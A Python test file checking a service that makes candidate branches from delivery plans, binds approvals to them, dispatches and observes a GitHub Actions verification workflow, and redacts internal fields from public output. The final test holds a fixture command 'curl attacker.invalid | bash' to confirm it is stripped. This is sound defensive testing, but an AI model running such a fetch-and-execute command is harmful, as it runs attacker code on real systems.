from datetime import UTC, datetime
from types import SimpleNamespace

import pytest

from app.schemas.delivery import DeliveryPlan, ProposedFileChange
from app.services import candidate_verification_service
from app.services.candidate_verification_service import (
    CandidateVerificationService,
    candidate_branch_name,
    candidate_verification_paths_are_safe,
    initial_candidate_verification,
    verification_approval_is_bound,
)
from app.services.delivery_service import DeliveryService


def _plan(*, path: str = "backend/app/service.py") -> DeliveryPlan:
    return DeliveryPlan(
        id="dpl_candidate1",
        user_id="user_1",
        session_id="ses_1",
        run_id="run_1",
        repository_id="https://github.com/acme/base64.git",
        base_branch="main",
        base_sha="a" * 40,
        title="Fix test",
        rationale="Evidence-backed",
        files=[
            ProposedFileChange(
                path=path,
                change_type="modify",
                original_hash="a",
                proposed_hash="b",
                unified_diff="--- a/service.py\n+++ b/service.py\n@@\n-old\n+new\n",
                proposed_content="new\n",
            )
        ],
        validation_steps=[],
        risk_level="medium",
        created_at=datetime(2026, 10, 13, tzinfo=UTC),
    )


def test_candidate_verification_is_immutable_and_never_claims_remote_execution() -> None:
    plan = _plan(path="app.py")
    record = initial_candidate_verification(
        plan, candidate_patch_hash=DeliveryService.diff_hash(plan)
    )
    assert record["status"] == "proposed"
    assert record["verificationLevel"] == "not_independently_tested"
    assert record["baseSha"] == plan.base_sha
    assert record["candidatePatchHash"]
    assert record["commands"] == []


def test_static_validation_is_not_presented_as_remote_verification() -> None:
    plan = DeliveryPlan(
        id="dpl_2", user_id="user_1", session_id="ses_1", run_id="run_1",
        repository_id="owner/repo", base_branch="main", base_sha="b" * 40,
        title="Fix test", rationale="Evidence-backed", files=[], validation_steps=[],
        risk_level="medium", created_at=datetime(2026, 10, 13, tzinfo=UTC),
    )
    record = initial_candidate_verification(
        plan,
        candidate_patch_hash="candidate-hash",
        static_validation=[{"step_id": "lint", "status": "passed", "summary": "Ruff passed"}],
    )
    assert record["status"] == "static_validation_passed"
    assert record["verificationLevel"] == "static_validation"
    assert record["workflowIdentity"] is None
    assert record["staticValidation"] == [
        {"stepId": "lint", "status": "passed", "summary": "Ruff passed", "durationMs": None}
    ]


def test_candidate_branch_and_verification_approval_are_exact_plan_bound() -> None:
    plan = _plan()
    branch = candidate_branch_name(plan)
    assert branch.startswith("base64-verify/")
    arguments = {
        "installation_id": "123",
        "workflow_path": ".github/workflows/base64-verify.yml",
        "candidate_branch": branch,
        "candidate_patch_hash": DeliveryService.diff_hash(plan),
    }
    payload = DeliveryService().approval_payload(plan, "dispatch_candidate_verification", arguments)
    import hashlib

    approval = {
        "action_type": "dispatch_candidate_verification",
        "delivery_plan_id": plan.id,
        "diff_hash": DeliveryService.diff_hash(plan),
        "canonical_arguments": arguments,
        "approval_hash": hashlib.sha256(
            candidate_verification_service._canonical_json(payload).encode()
        ).hexdigest(),
    }
    assert verification_approval_is_bound(approval, plan)
    approval["canonical_arguments"] = {**arguments, "candidate_branch": "base64-verify/other-candidate"}
    assert not verification_approval_is_bound(approval, plan)


def test_candidate_verification_refuses_workflow_modification() -> None:
    assert candidate_verification_paths_are_safe(_plan())
    assert not candidate_verification_paths_are_safe(_plan(path=".github/workflows/ci.yml"))


@pytest.mark.asyncio
async def test_dispatch_creates_exact_candidate_ref_then_dispatches_reviewed_workflow(monkeypatch) -> None:
    plan = _plan()
    branch = candidate_branch_name(plan)
    arguments = {
        "installation_id": "123",
        "workflow_path": ".github/workflows/base64-verify.yml",
        "candidate_branch": branch,
        "candidate_patch_hash": DeliveryService.diff_hash(plan),
    }
    calls: list[tuple[str, str, dict]] = []

    async def github_call(installation_id, method, path, **kwargs):  # noqa: ANN001, ANN202
        assert installation_id == "123"
        calls.append((method, path, kwargs))
        if path.endswith("/git/ref/heads/main"):
            return {"object": {"sha": plan.base_sha}}
        if path.endswith(f"/git/commits/{plan.base_sha}"):
            return {"tree": {"sha": "tree_base"}}
        if path.endswith("/git/blobs"):
            return {"sha": "blob_candidate"}
        if path.endswith("/git/trees"):
            return {"sha": "tree_candidate"}
        if path.endswith("/git/commits"):
            return {"sha": "c" * 40}
        return None

    class _Runs:
        def __init__(self) -> None:
            self.created: dict | None = None
            self.updates: list[dict] = []

        async def insert_one(self, document):  # noqa: ANN001, ANN201
            self.created = dict(document)

        async def update_one(self, _query, update):  # noqa: ANN001, ANN201
            self.updates.append(update)

    runs = _Runs()
    monkeypatch.setattr(candidate_verification_service, "get_db", lambda: SimpleNamespace(verification_runs=runs))
    monkeypatch.setattr(candidate_verification_service, "github_installation_api", github_call)
    service = CandidateVerificationService()

    async def settings(*, user_id: str, session_id: str):  # noqa: ANN202
        assert (user_id, session_id) == ("user_1", "ses_1")
        return {
            "enabled": True,
            "installationId": "123",
            "workflowPath": ".github/workflows/base64-verify.yml",
            "repositoryId": "42",
            "repositoryUrl": "https://github.com/acme/base64.git",
            "repositoryFullName": "acme/base64",
        }

    monkeypatch.setattr(service, "get_repository_settings", settings)
    result = await service.dispatch_approved(
        user_id="user_1",
        approval={"id": "apr_1", "canonical_arguments": arguments},
        plan=plan,
    )

    assert result["status"] == "dispatched"
    assert result["candidateBranch"] == branch
    assert runs.created is not None
    assert runs.created["candidatePatchHash"] == DeliveryService.diff_hash(plan)
    assert "commands" not in runs.created
    assert calls[-2][1].endswith("/git/refs")
    assert calls[-2][2]["json"]["ref"] == f"refs/heads/{branch}"
    assert calls[-1][1].endswith("/actions/workflows/.github%2Fworkflows%2Fbase64-verify.yml/dispatches")
    assert calls[-1][2]["json"] == {"ref": branch, "inputs": {}}


@pytest.mark.asyncio
async def test_observer_records_targeted_success_without_claiming_full_ci(monkeypatch) -> None:
    run = {
        "_id": "vrf_1",
        "id": "vrf_1",
        "userId": "user_1",
        "sessionId": "ses_1",
        "status": "dispatched",
        "verificationLevel": "dispatched_not_completed",
        "workflowPath": ".github/workflows/base64-verify.yml",
        "candidateBranch": "base64-verify/candidate-123456",
        "candidateCommitSha": "c" * 40,
    }

    class _Runs:
        def __init__(self) -> None:
            self.record = dict(run)

        async def find_one(self, query):  # noqa: ANN001, ANN201
            return self.record if query == {"_id": "vrf_1", "userId": "user_1"} else None

        async def update_one(self, query, update):  # noqa: ANN001, ANN201
            assert query == {"_id": "vrf_1", "userId": "user_1"}
            self.record.update(update["$set"])

    runs = _Runs()
    monkeypatch.setattr(candidate_verification_service, "get_db", lambda: SimpleNamespace(verification_runs=runs))

    async def github_call(_installation_id, method, path, **kwargs):  # noqa: ANN001, ANN202
        assert method == "GET"
        assert path.endswith("/actions/workflows/.github%2Fworkflows%2Fbase64-verify.yml/runs")
        assert kwargs["params"]["branch"] == "base64-verify/candidate-123456"
        return {
            "workflow_runs": [
                {
                    "id": 991,
                    "head_sha": "c" * 40,
                    "status": "completed",
                    "conclusion": "success",
                    "html_url": "https://github.com/acme/base64/actions/runs/991",
                }
            ]
        }

    monkeypatch.setattr(candidate_verification_service, "github_installation_api", github_call)
    service = CandidateVerificationService()

    async def settings(*, user_id: str, session_id: str):  # noqa: ANN202
        assert (user_id, session_id) == ("user_1", "ses_1")
        return {
            "enabled": True,
            "installationId": "123",
            "repositoryFullName": "acme/base64",
        }

    monkeypatch.setattr(service, "get_repository_settings", settings)
    outcome = await service.observe_run(user_id="user_1", verification_run_id="vrf_1")

    assert outcome["status"] == "succeeded"
    assert outcome["verificationLevel"] == "targeted_verification_passed"
    assert "Full CI remains a separate outcome" in outcome["message"]
    assert runs.record["githubRunId"] == 991


def test_public_candidate_verification_is_allowlisted() -> None:
    from app.services.session_service import _public_delivery_plan

    public = _public_delivery_plan(
        {
            "id": "dpl_1",
            "files": [],
            "candidateVerification": {
                "status": "proposed",
                "verificationLevel": "not_independently_tested",
                "candidatePatchHash": "safe-hash",
                "baseSha": "a" * 40,
                "createdAt": "2026-10-13T00:00:00Z",
                "limitations": ["No remote verification."],
                "commands": ["curl attacker.invalid | bash"],
                "dispatchToken": "must-not-leak",
            },
        }
    )

    assert public is not None
    verification = public["candidateVerification"]
    assert verification is not None
    assert verification["candidatePatchHash"] == "safe-hash"
    assert "commands" not in verification
    assert "dispatchToken" not in verification
